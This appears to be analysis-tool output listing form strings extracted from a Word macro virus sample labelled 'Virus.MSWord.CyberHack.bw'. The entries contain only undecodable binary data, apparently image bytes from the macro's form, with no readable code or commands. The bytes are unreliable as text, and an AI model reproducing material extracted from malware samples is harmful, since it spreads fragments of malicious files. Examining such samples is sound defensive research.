VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!��{��s��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{�֭�������������Z1�Z1�Z1�Z1�Z1�Z1�kB�Z1�kB�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kBƜc���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB��������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�{J�{J�{J�ބ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J��s��s��s��k��k�k�k�kޥcޥc֜RΜZΌJƜcΌJ��c��c��c91
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kR�Μ�Ɯֽ�ֽ�ֽ�ֽ�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��������������������������{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��s11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ƭ{����眜�c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��cRJB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1�{ZcZB11!91!91!11!11!11!11!11!91!11!11!91!11!11!11!91!91!11!ZJ1������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��k��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{�֭�������������Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1��������ބZ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�������{9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�{J�{J�{J�{J���91
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s��s��s��s��s��k�k�kޥcޥc֜R֜RΜZƜcΌJ��c��c��RZB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sZ�Μ�Μ�Ɯֽ�ֽ�ֽ�ֽ�ν�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��������������������������������{��{��{��{��{��{��{��{��{��{��s11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������Μ��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c{kJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��k��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{���������������Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1ޜR��������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�c)�������{J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�{J�{J�{J�ބ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J��s��s�΄��s��s��s�k�kޥcޥc֜RΜZΜZƜcΌJ��c��c�Z1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sZ�֭�Μ�Μ�Μ�Ɯֽ�ֽ�ֽ�ֽ�ν�ν�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��������������������������������������������s))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ֽ���c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k�֭���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�֭������������cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�s9�s9�c)sZ991
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1��s����{J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J���sZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1�ބ�ބ�ք�ք��s��s�s�k�kޥc֥cΜZΜZƜcƜc��c��c�{J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z�֭�Μ�Μ�Μ�Μ�Μ�Ɯ�Ɯֽ�ֽ�ֽ�ֽ�ν�ν�ν�ν�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ƭ{Ƶ�ƭ{ƭ{ƭ{ƭ{������ƭ{��������������s))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������Ƶ���k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k{kJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ�sJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z��Z��c��Z��c��c��Z��Z��c��c��Z��Z��c��c��c��c��c��c��c��Z�Ƅ���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�Ƅ������������9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�Z)�Z)�R)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z){R)sJ!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�Z)�Z)�Z)�Z)�Z)�Z1�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z1�Z1�Z)�Z1��s���kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J֥c���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ք�ޔ�ބ�ք�΄��s��s�s�kޭk֥c֥cΜcΜZƜcƜc��c��c!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z�֭�Μ�Μ�Μ�Μ�Μ�Ɯ�Ɯ�Ɯ�Ɯֽ�ֽ�ν�ν�ν�ν�ν�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ƭ{ƭ{ƭ{�����������������{11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!��������s��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��kJB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ�sJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJ�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z޵{������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{R){R){R){R){R){R){R){R){R)�R){R){R){R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R){R)sJ!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R)�R)�Z)�R)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)�Z)��s���kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�ބ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)sZ9sZ9kR9cR1cR1ZB1ZB1RB)RB)J9!J9!J9!J9!J9!J9!B1!B1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z�֭�Μ�Μ�Μ�Μ�Μ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯν�ν�ν�ν�ν�ν�ν�ν�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ������������{))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcB�����凜k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k�sZ�kR�kR�kR�sZ�sZ�sZ�sZ�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�{Z������������sJ{kJ{kJ�sJ{kJ�sJ{kJ{kJ�sJ�sJ{kJ�sJ�sJ�sJ�sJ�sJ�sJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJ�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{RΥs�������������{J)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R��Z�{R�{R�{R��Z��Z��Z��Z��Z֭s������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{R){J!sJ!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!91
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)�R)��k��ބkB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z�֭�Υ�Μ�Μ�Μ�Μ�Μ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯν�ν�ν�ν�ν�ν�ν�ν�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ���{))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�����ﭜs��s��s��s��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k�Ƅ����������sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{R�{R�{R�{R�{R�{R�{R�{R�{Z�{Z�{R�{R�{R�{Z�{Z�{R�{Z�{Z�{Z�{Z�{Z�{Z�{Z��Z�{Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{J!sJ!{J!{J!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!sJ!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!�R!�R!�R)�R!�R!�R!�R!��k��ބZ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB1�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��R����ބ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c���֭�֭�Υ�Μ�Μ�Μ�Μ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�Ƶ�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ���{)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Μ�����ޭ�s��s��s��s��s��s��s��k��s��s��s��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��kֽ�����������sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�kR�sJ�sJ�sJ�sJ�sJ�kR�sJ�kRcZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{R�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�Ƅ������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{J!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!�R!{J!�R!�R!�R!�R!�R)�R)�R)�R!�R!��k����Z1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB1�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��R������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c�޵�֭�֭�֭�Υ�Υ�Μ�Μ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ���{))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�֭��������s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��k��k��s��s��k��k��s��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��s��k��kֽ�����������kR�sJ�sJ�sJ�kR�sJ�kR�kR�sJ�kR�kR�kR�kR�kR�kR�kR�kRcZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{R�{R�{R�{R�{R�{Z�{R�{Z�{R�{Z�{Z�{Z�{R�{R�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!{J!{J!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!�R!�R!�R!�R!�R!��k����Z1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c�޵�֭�֭�֭�֭�Υ�Υ�Υ�Μ�Μ�Μ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν���{))
-------------------------------------------------------------------------------
